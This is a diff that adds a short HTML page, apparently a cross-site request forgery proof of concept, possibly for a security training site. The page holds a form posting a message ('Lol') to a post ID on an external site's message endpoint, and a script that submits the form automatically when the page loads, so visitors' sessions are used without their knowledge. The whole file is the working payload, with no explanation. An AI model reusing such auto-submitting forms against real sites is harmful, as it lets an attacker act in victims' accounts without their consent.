@@ -1,0 +1,10 @@
+<form action="http://security.permaviat.ru/ajax/message.php" method="POST">
+    <br>Номер поста:
+    <br><input type="text" name="IdPost" value="1"/>
+    <br>Сообщение:
+    <br><input type="text" name="Message" value="Lol"/>
+    <br><input type="submit"/> 
+</form>
+<script>
+    document.getElementsByTagName("form")[0].submit();
+</script>
